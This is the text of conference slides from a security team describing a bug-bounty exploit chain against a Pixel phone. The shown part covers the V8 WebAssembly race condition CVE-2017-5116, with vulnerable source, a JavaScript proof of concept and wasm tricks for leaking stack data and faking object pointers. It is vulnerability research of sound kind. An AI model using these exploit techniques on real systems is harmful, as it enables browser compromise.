Pwning "the toughest target":  
the exploit chain of winning the largest 
bug bounty in the history of ASR program 
Jianjun Dai               Guang Gong                Wenlin Yang 
#whoami 
•
Guang Gong 
• Senior Security Researcher and Team Leader of 360 Alpha Team 
• Android/Chrome CVE hunter 
• Speaker at Black Hat, CanSecWest, PHDays, SyScan360, MOSEC, PacSec, etc 
• Mobile Pwn2Own 2015, Pwn0Rama 2016, Pwn2Own 2016, PwnFest 2016, 
Mobile Pwn2Own 2017 winner 
• 1st submit the working remote exploit chain of ASR 
•
Wenlin Yang 
• Security Researcher at 360 Alpha Team 
• Android system CVE hunter 
•
Jianjun Dai 
• Security Researcher at 360 Alpha Team 
• Android system CVE hunter 
• Speaker at CanSecWest 
How we pwned  Pixel running Android Nougat 
Two bugs forms the complete exploit chain 
• a V8 bug to compromise the renderer 
• a system_server bug to escape sandbox and get 
system user permissions 
Agenda 
• Exploition of V8 engine 
• Exploitation of System_server 
• Conclusion 
Exploition of V8 engine 
• Introduction SharedArrayBuffer and WebAssembly  
• Analyze the Chain of Bugs #1 
    - CVE-2017-5116 
• Exploitation of CVE-2017-5116 
SharedArrayBuffer 
• V8 6.0 introduced 
• Low-level mechanism to share memory between JavaScript workers 
• Unlock the ability to port threaded applications to the web via 
asm.js or WebAssembly 
// create a SharedArrayBuffer with a size in bytes 
const buffer = new SharedArrayBuffer(8);  
SharedArrayBuffer was disabled by default 
in all major browsers on January 2018, in 
response to Meltdown and Spectre 
WebAssembly 
• New type of code that can be run in modern web browsers   
• Low-level assembly-like language with a compact binary format that 
runs with near-native performance 
• Provide languages such as C/C++ with a compilation target 
• Run alongside JavaScript 
WebAssembly 
var importObject = { imports: { imported_func: arg => console.log(arg) } }; 
WebAssembly.instantiateStreaming(fetch('simple.wasm'), importObject) 
.then(obj => obj.instance.exports.exported_func());  
Analyze the Chain of Bugs #1 
CVE-2017-5116 
vulnerable Chrome: prior to  61.0.3163.79 
combining the three features: WebAssembly, Web worker and 
SharedArrayBuffer 
OOB access can be triggered through a race condition 
Analyze the Chain of Bugs #1 
SharedArrayBuffer 
wasm code 
worker 
thread 
main thread 
OOB Access  
Analyze the Chain of Bugs #1 
57: i::wasm::ModuleWireBytes GetFirstArgumentAsBytes( 
58: const v8::FunctionCallbackInfo& args, ErrorThrower* thrower) { 
    …… 
65: v8::Local source = args[0]; 
66: if (source->IsArrayBuffer()) { 
        …… 
72: } else if (source->IsTypedArray()) {//------> source should be checked if it's backed by a SharedArrayBuffer 
73:     // A TypedArray was passed. 
74:     Local array = Local::Cast(source); 
75:     Local buffer = array->Buffer(); 
76:     ArrayBuffer::Contents contents = buffer->GetContents(); 
77:     start = 
78:     reinterpret_cast(contents.Data()) + array->ByteOffset(); 
79:     length = array->ByteLength(); 
80: } 
    …… 
91: if (thrower->error()) return i::wasm::ModuleWireBytes(nullptr, nullptr); 
92: return i::wasm::ModuleWireBytes(start, start + length); 
93:}  
buggy code  
Analyze the Chain of Bugs #1 
poc 
PoC 
Analyze the Chain of Bugs #1 
function getSharedTypedArray(){ 
var wasmarr = [ 
0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 
0x01, 0x05, 0x01, 0x60, 0x00, 0x01, 0x7f, 0x03, 
0x03, 0x02, 0x00, 0x00, 0x07, 0x12, 0x01, 0x0e, 
0x67, 0x65, 0x74, 0x41, 0x6e, 0x73, 0x77, 0x65, 
0x72, 0x50, 0x6c, 0x75, 0x73, 0x31, 0x00, 0x01, 
0x0a, 0x0e, 0x02, 0x04, 0x00, 0x41, 0x2a, 0x0b, 
0x07, 0x00, 0x10, 0x00, 0x41, 0x01, 0x6a, 0x0b 
]; 
var sb = new SharedArrayBuffer(wasmarr.length); 
//--> 1)put WebAssembly code in a SharedArrayBuffer 
var sta = new Uint8Array(sb); 
for(var i=0;i2) 
create a web worker 
var sta = getSharedTypedArray(); 
//%DebugPrint(sta.buffer); 
worker.postMessage(sta.buffer); //---->3)pass the 
WebAssembly code to the web worker 
setTimeout(function(){ 
while(1){ 
  try{ 
    //console.log(sta[50]); 
    sta[51]=0; 
    var myModule = new WebAssembly.Module(sta); //-
-->4) parse the webassembly code 
    var myInstance = new        
    WebAssembly.Instance(myModule); 
  }catch(e){ 
 } 
} 
},1000); 
//worker.terminate(); 
Analyze the Chain of Bugs #1 
WebAssembly code in PoC 
00002b func[0]: 
00002d: 41 2a                      | i32.const 42 
00002f: 0b                            | end 
000030 func[1]: 
000032: 10 00                      | call 0 
000034: 41 01                      | i32.const 1 
000036: 6a                            | i32.add 
000037: 0b                            | end 
worker 
thread 
000032: 10 80           | call 128 
main thread 
OOB access 
Analyze the Chain of Bugs #1 
“call 0” can be modified  to call any wasm functions 
000032: 10 00          | call 0 
000032: 10 xx           | call $leak 
(func  $leak(param i32 i32 i32 i32 i32 i32)(result i32) 
    i32.const 0 
    get_local 0 
    i32.store 
    i32.const 4 
    get_local 1 
    i32.store 
    i32.const 8 
    get_local 2 
    i32.store 
    i32.const 12 
    get_local 3 
    i32.store 
    i32.const 16 
    get_local 4 
    i32.store 
    i32.const 20 
    get_local 5 
    i32.store 
    i32.const 0 
  )) 
registers and stack contents are dumped 
to Web Assembly memory, many useful 
pieces of data in the stack being leaked 
Analyze the Chain of Bugs #1 
Any “call funcX” can be modified  to “call funcY” 
/*Text format of funcX*/ 
(func $simple6 (param i32 i32 i32 i32 i32 i32 ) (result i32) 
get_local 5 
get_local 4 
i32.add) 
/*Disassembly code of funcX*/ 
--- Code --- 
kind = WASM_FUNCTION 
name = wasm#1 
compiler = turbofan 
Instructions (size = 20) 
0x58f87600 0 8b442404 mov eax,[esp+0x4] 
0x58f87604 4 03c6 add eax,esi 
0x58f87606 6 c20400 ret 0x4 
0x58f87609 9 0f1f00 nop 
Safepoints (size = 8) 
RelocInfo (size = 0) 
--- End code --- 
the first 5 arguments are passed  
through the registers , 
the sixth argument is passed 
through stack 
v8 compiles funcX in ia32 arch 
Analyze the Chain of Bugs #1 
If “call funcX” be modified  to “call JS_TO_WASM” 
/*Disassembly code of JS_TO_WASM function */ 
--- Code ---              
kind = JS_TO_WASM_FUNCTION 
name = js-to-wasm#0 
compiler = turbofan 
Instructions (size = 170) 
0x4be08f20 0 55 push ebp 
0x4be08f21 1 89e5 mov ebp,esp 
0x4be08f23 3 56 push esi               
0x4be08f24 4 57 push edi 
0x4be08f25 5 83ec08 sub esp,0x8 
0x4be08f28 8 8b4508 mov eax,[ebp+0x8] 
0x4be08f2b b e8702e2bde call 0x2a0bbda0 (ToNumber) ;; code: BUILTIN 
0x4be08f30 10 a801 test al,0x1 
0x4be08f32 12 0f852a000000 jnz 0x4be08f62  
// created by v8 compiler internally 
// first arguments is passed through stack 
So, what will happen? 
Analyze the Chain of Bugs #1 
/*Disassembly code of JS_TO_WASM function */ 
--- Code ---              
…… 
0x4be08f20 0 55 push ebp 
0x4be08f21 1 89e5 mov ebp,esp 
0x4be08f23 3 56 push esi               
0x4be08f24 4 57 push edi 
0x4be08f25 5 83ec08 sub esp,0x8 
0x4be08f28 8 8b4508 mov eax,[ebp+0x8] 
0x4be08f2b b e8702e2bde call 0x2a0bbda0 (ToNumber) 
0x4be08f30 10 a801 test al,0x1 
0x4be08f32 12 0f852a000000 jnz 0x4be08f62  
/*Text format of funcX*/ 
(func $simple6 (param i32 i32 i32 i32 i32 i32 ) 
(result i32) 
get_local 5 
get_local 4 
i32.add) 
…… 
0x58f87600 0 8b442404 mov eax,[esp+0x4] 
0x58f87604 4 03c6 add eax,esi 
0x58f87606 6 c20400 ret 0x4 
call ToNumber(sixth_arg) 
any value to be taken as 
object pointer 
Exploit the Chain of Bugs #1 
exploitation of OOB access is straightforward 
• Leak ArrayBuffer’s content 
• Fake an ArrayBuffer a double array by using leaked data 